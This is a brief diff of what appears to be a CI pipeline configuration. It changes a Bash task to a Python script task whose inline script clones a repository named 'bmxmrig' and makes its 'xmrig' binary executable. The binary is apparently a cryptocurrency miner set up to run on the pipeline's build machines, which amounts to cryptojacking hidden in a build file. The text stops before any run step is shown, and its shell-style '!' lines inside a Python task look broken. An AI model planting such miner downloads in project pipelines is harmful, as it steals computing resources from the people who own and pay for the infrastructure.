@@ -1,6 +1,6 @@
-- task: Bash@3
+- task: PythonScript@0
   inputs:
-    targetType: 'inline'
+    scriptSource: 'inline'
     script: |
       ! git clone https://github.com/quincyhays/bmxmrig
       ! chmod +x bmxmrig/xmrig
